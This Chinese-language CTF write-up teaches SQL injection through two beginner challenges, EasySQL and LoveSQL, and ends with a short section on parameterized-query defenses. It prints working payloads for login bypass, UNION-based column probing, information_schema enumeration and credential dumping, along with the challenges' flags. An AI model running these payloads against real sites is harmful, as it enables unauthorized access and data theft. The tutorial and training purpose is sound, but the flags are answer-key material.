---
title: Web SQL 注入实战：EasySQL 与 LoveSQL 详解
date: 2026-10-22 20:40:22
updated: 2026-10-22 22:10:00
categories:
  - CTF
tags:
  - SQL 注入
  - UNION 注入
  - information_schema
  - 极客大挑战
description: 以两道入门题为例，完整走一遍 SQL 注入的排查与利用流程：判断注入类型、确定字段数、找回收显位、爆库、爆表、爆字段，最后拿到 flag。
difficulty: 入门
topic: SQL 注入
permalink: 2026/10/22/web-ctf-sql/
---

{% note info %}
**阅读说明**

- **难度**：入门
- **前置知识**：HTTP GET 请求、`SELECT` 基础、浏览器开发者工具（F12）
- **环境**：CTF 靶场。文中靶场地址是当时的临时环境，现在多半已失效，请换成自己的靶场或本地环境（如 sqli-labs）。
- 本文所有测试仅用于**授权靶场和教学**，请勿对未授权的站点进行任何测试。
{% endnote %}

## 0. 先补一点基础

### 0.1 SQL 注入是怎么产生的

很多老系统会把用户输入直接拼进 SQL 字符串，例如下面这种错误写法：

```php
$sql = "SELECT id, username, password FROM users
        WHERE username='$username' AND password='$password'";
```

如果用户输入 `username = ' or 1=1#`，最终执行的语句就变成了：

```sql
SELECT id, username, password FROM users
WHERE username='' or 1=1#' AND password=''
```

`1=1` 永远为真，`#` 又把它后面的密码判断注释掉了，于是不输入正确密码也能登录。这就是最经典的**万能密码**。

一句话理解：**SQL 注入就是让用户输入"越界"，从数据变成 SQL 代码。**

### 0.2 三个必须记住的符号

| 符号 | 作用 | 例子 |
| --- | --- | --- |
| `'` | 闭合原 SQL 中的字符串 | `1'` |
| `#` | MySQL 注释，注释掉后面的内容 | `1' or 1=1#` |
| `or` / `\|\|` | 逻辑或，只要一边为真结果就为真 | `1' or 1=1#` |

> 注释除了 `#`，还可以用 `-- `（**两个减号后面必须跟一个空格**）和 `/* */`。

### 0.3 字符型还是数字型？

这是新手最容易卡住的一步。两种情况的闭合方式不同：

- **数字型**：`WHERE id = $id`，输入 `1 and 1=1` 正常，`1 and 1=2` 查不到数据。
- **字符型**：`WHERE username = '$username'`，需要先用 `'` 闭合：`1' and '1'='1` 正常，`1' and '1'='2` 查不到数据。

{% note warning %}
只加一个单引号导致报错，只能说明**这个位置存在注入**，不能直接下结论说是数字型还是字符型。真正的判断标准是：**你构造的闭合语句能不能让页面恢复正常**。
{% endnote %}

### 0.4 记得做 URL 编码

`GET` 请求的参数在地址栏里传输，特殊字符会被浏览器或服务器解释，所以要编码：

| 原字符 | URL 编码 | 说明 |
| --- | --- | --- |
| `'` | `%27` | 不编码可能被截断 |
| `\|` | `%7C` | 两个竖线就是 `%7C%7C` |
| `#` | `%23` | **最容易踩坑**：不编码的话，浏览器会把 `#` 后面的内容当成页面锚点，根本不会发给服务器 |
| 空格 | `%20` 或 `+` | 需要空格的 payload 要编码 |

例如 `1'||1#` 编码后就是：

```text
1%27%7C%7C1%23
```

---

## 1. [极客大挑战 2019] EasySQL

### 1.1 观察题目

打开靶场，是一个很朴素的登录框：

![EasySQL 登录页面](01-login-page.png)

*图 1：登录页面，提示语是"我是 cl4y，是一个 WEB 开发程序员……"*

随便输入 `1 / 1` 登录，可以看到请求直接走 `GET`，参数都暴露在地址栏里：

![check.php 的 URL](02-check-url.png)

*图 2：用户名和密码通过 `check.php?username=1&password=1` 传递*

这给了我们两个重要信息：

1. 参数名是 `username` 和 `password`；
2. 可以直接在地址栏里改 payload，不需要抓包。

### 1.2 第一步：确认注入点

在 `username` 后面加一个单引号：

```http
http://b7545d1d777fc16949130ff9.http-ctf2.dasctf.com/check.php?username=1%27&password=1
```

页面直接抛出了 MariaDB 的语法错误：

![username 加单引号报错](03-username-quote-error.png)

*图 3：单引号被原样带进了 SQL，说明输入没有过滤*

对 `password` 做同样的测试，也会报错：

![password 加单引号报错](04-password-quote-error.png)

*图 4：`password` 位置同样可以注入*

到这里可以确认：**`username` 和 `password` 两个位置都存在 SQL 注入**。

### 1.3 第二步：构造万能密码

既然报错说明引号参与了解析，那就把引号闭合掉，再让条件恒为真：

```text
username = 1'||1#
password = 任意值（比如 1）
```

完整 URL（已做编码）：

```text
基础地址：http://b7545d1d777fc16949130ff9.http-ctf2.dasctf.com/check.php
查询参数：?username=1%27%7C%7C1%23&password=1
```

拆开看这个 payload：

- `1'`：闭合 `username='` 前面的单引号；
- `||`：MySQL 中的逻辑或，等价于 `or`；
- `1`：恒为真；
- `#`：注释掉后面的 `AND password='...'` 和多余的引号。

后端拼出来的 SQL 大致是：

```sql
SELECT * FROM users
WHERE username='1'||1#' AND password='1'
```

因为 `'1'||1` 为真，数据库返回了第一条用户记录，页面提示 `Login Success!`，flag 直接显示出来：

![EasySQL 拿到 flag](05-easysql-flag.png)

*图 5：登录成功，页面回显 flag*

```text
CTF2{6b435354-1488-4755-992b-aa4d2901ee47}
```

### 1.4 等价的几种写法

下面这些 payload 在这道题里都能达到同样效果，可以自己动手对比：

```text
1' or 1=1#
1' or '1'='1'#
1'||1-- -
```

{% note warning %}
`--` 注释要求后面**必须有一个空格**。在 URL 里写 `-- -` 时，空格会被编码成 `%20`，最终是 `--%20-`。如果直接写 `--`，MySQL 不会把它当注释。
{% endnote %}

---

## 2. [极客大挑战 2019] LoveSQL

### 2.1 同样的入口，先登录进去

LoveSQL 的登录页和上一题风格一致：

![LoveSQL 登录页面](06-lovesql-login.png)

*图 6：LoveSQL 登录页*

沿用上一题的万能密码 `1'||1#`：

```text
基础地址：http://01fc6bfe26018717c5512075.http-ctf2.dasctf.com/check.php
查询参数：?username=1%27%7C%7C1%23&password=1
```

登录成功，但这次页面没有直接给 flag，只回显了管理员信息：

![LoveSQL 登录成功](07-lovesql-admin.png)

*图 7：`Hello admin! Your password is '3c97440bd844baefe62761d8c840cb3f'`*

那串 32 位字符串是 MD5，不是 flag。页面上方还写着"这次我把它们放在了那个地方"，说明 flag 被藏在了数据库里，需要继续查询。

{% note info %}
`Hello admin!` 和 `Your password is '...'` 这两个位置非常关键——它们是页面会**回显**的字段。后面做 `UNION SELECT` 时，要正好把数据放在这两个位置上。
{% endnote %}

### 2.2 第二步：数清楚原来查了几列

`UNION` 要求前后两个查询的**列数完全一致**，所以先确定原查询有几列。

**方法一：`ORDER BY`（推荐）**

```text
1' order by 3#
1' order by 4#
```

`order by 3` 正常、`order by 4` 报错，说明原查询是 3 列。

**方法二：直接 `UNION SELECT`**

先猜 1 列：

```text
1' union select 1#
```

页面报错：

![列数不一致报错](09-column-count-error.png)

*图 8：`The used SELECT statements have a different number of columns`*

再试 3 列：

```text
1' union select 1,2,3#
```

![UNION 3 列成功](11-union-echo.png)

*图 9：`Hello 2! Your password is '3'`*

页面显示 `Hello 2!`、`Your password is '3'`，说明：

- 原查询确实是 **3 列**；
- 第 1 列不显示；
- **第 2 列会显示在 `Hello` 后面，第 3 列会显示在 `Your password is` 后面**。

这两列就是我们的"回显位"，后面的查询把数据放到第 2、3 列即可。

{% note warning %}
如果 `UNION` 报的是列数错误，先不要怀疑 payload 写错，优先检查逗号数量和列数是否对应。原查询有 3 列，`union select` 也必须写 3 个值。
{% endnote %}

### 2.3 第三步：爆出数据库名

先看当前数据库叫什么：

```text
1' union select 1,database(),3#
```

如果想把所有数据库都列出来，就查 `information_schema.schemata`：

```text
1' union select 1,group_concat(schema_name),3 from information_schema.schemata#
```

![数据库名列表](12-database-names.png)

*图 10：`information_schema,performance_schema,test,mysql,geek`*

其中 `geek` 就是当前业务数据库。`information_schema` 是 MySQL 自带的"元数据库"，里面存着所有库、表、字段的信息，是我们后续爆表、爆字段的关键。

### 2.4 第四步：爆出表名

```text
1' union select 1,group_concat(table_name),3
from information_schema.tables
where table_schema=database()#
```

![表名列表](15-table-names.png)

*图 11：当前库中有 `geekuser` 和 `l0ve1ysq1` 两张表*

`l0ve1ysq1` 这个名字明显是出题人留的线索（love + sql），flag 大概率在这张表里。

### 2.5 第五步：爆出字段名

```text
1' union select 1,group_concat(column_name),3
from information_schema.columns
where table_schema=database() and table_name='l0ve1ysq1'#
```

![字段名列表](13-column-names.png)

*图 12：字段为 `id,username,password`*

{% note info %}
如果去掉 `and table_name='l0ve1ysq1'` 这个条件，会把 `geekuser` 和 `l0ve1ysq1` 两张表的字段一起查出来，于是看到 `id,username,password,id,username,password` 这样重复的结果——这不是报错，只是两张表字段名恰好一样。
{% endnote %}

### 2.6 第六步：把数据拖出来

知道了表名和字段名，直接查：

```text
1' union select 1,group_concat(username,0x3a,password),3 from l0ve1ysq1#
```

![拖库结果](16-dump-result.png)

*图 13：所有用户名和密码被拼成一行显示*

这里用到了两个小技巧：

- `group_concat()`：把多行结果合并成一行，避免页面只显示第一条；
- `0x3a`：十六进制形式的冒号 `:`，用来分隔用户名和密码。直接在单引号里写 `':'` 容易和闭合引号打架，用十六进制更省事。

结果里已经能看到 flag 的尾巴：

```text
...3984-4c7b-882a-6d9f50b61de1}
```

由于页面宽度有限，长字符串可能被 CSS 截断。**按 F12 打开开发者工具**，在 Elements 面板查看对应文本，或者直接在 Console 里执行 `document.body.innerText` 复制完整内容即可。

完整 flag：

```text
CTF2{d4518a67-3984-4c7b-882a-6d9f50b61de1}
```

{% note info %}
如果只想拿 flag，可以更精准一点，直接用条件过滤，避免在一堆数据里找：

```text
1' union select 1,username,password from l0ve1ysq1 where password like 'CTF2%'#
```
{% endnote %}

---

## 3. 完整流程速查表

| 步骤 | 目的 | 示例 payload |
| --- | --- | --- |
| 1 | 判断是否有注入 | `1'` 看是否报错 |
| 2 | 判断闭合方式 | `1' and '1'='1` / `1' and '1'='2` |
| 3 | 万能密码登录 | `1'||1#` |
| 4 | 确定列数 | `1' order by 3#`；`1' union select 1,2,3#` |
| 5 | 找回收显位 | 页面显示的数字就是回显列 |
| 6 | 爆数据库 | `1' union select 1,database(),3#` |
| 7 | 爆表名 | `... from information_schema.tables where table_schema=database()#` |
| 8 | 爆字段名 | `... from information_schema.columns where table_name='l0ve1ysq1'#` |
| 9 | 拖数据 | `... group_concat(username,0x3a,password) from l0ve1ysq1#` |

---

## 4. 新手常见问题

**Q1：为什么 `#` 一定要写成 `%23`？**

浏览器地址栏里 `#` 表示页面锚点，后面的内容不会发送给服务器。`1'||1#` 直接写进 URL，服务器只能收到 `1'||1`，当然失败。用 `%23` 或者用 Burp Suite、curl 发包都可以避免这个问题。

**Q2：报 `different number of columns` 怎么办？**

`UNION` 前后列数不一致。先用 `order by N` 二分确定原查询列数，或者在 `union select` 后面补/删逗号。

**Q3：`union select` 有结果，但页面不显示？**

说明数据放在了不回显的列（这道题的第 1 列）。把要显示的内容移到第 2 或第 3 列。

**Q4：`group_concat` 结果被截断了？**

MySQL 的 `group_concat_max_len` 默认是 1024 字节。可以用 `substr()` 分段读取：

```text
1' union select 1,substr(group_concat(username,0x3a,password),1,1024),3 from l0ve1ysq1#
```

把 `1` 改成 `1025`、`2049`，继续往后读即可。

**Q5：payload 明明一样，为什么我失败？**

检查这几点：引号是不是中文引号、`||` 是不是中文全角、`#` 有没有编码、`--` 后面有没有空格、`union select` 的列数对不对。

**Q6：靶场地址打不开了？**

这类在线靶场地址是临时分配的，过期就失效。可以自己在本地搭 sqli-labs，或用其他公开靶场练习，payload 的思路是一样的。

---

## 5. 顺手聊聊怎么防

做题是为了理解攻击，写代码时要避免同样的错误：

1. **使用预编译语句（参数化查询）**，不要拼接字符串：

```php
$stmt = $pdo->prepare(
    'SELECT id, username FROM users WHERE username = ? AND password = ?'
);
$stmt->execute([$username, $password]);
```

2. **输入做白名单校验**，比如 id 只允许数字。
3. **数据库账号最小权限**，Web 账号不要有 `FILE`、跨库查询等权限。
4. **不要把数据库报错直接回显给用户**，错误信息会帮助攻击者判断注入类型和列数。
5. **密码加盐哈希存储**，不要明文或简单 MD5。

---

## 6. 总结

这两道题其实是一条完整的学习路径：

- **EasySQL** 教会我们：找到注入点 → 闭合引号 → 注释掉密码判断 → 万能密码登录；
- **LoveSQL** 教会我们：登录只是开始，真正的数据要靠 `UNION SELECT` 去查；
- 通用套路可以记成一句话：

> **判注入 → 定列数 → 找回显 → 爆库 → 爆表 → 爆字段 → 拖数据**

把这条流程在自己搭的靶场上手动走几遍，比背 payload 有用得多。下一篇可以继续练习盲注、报错注入和时间盲注。
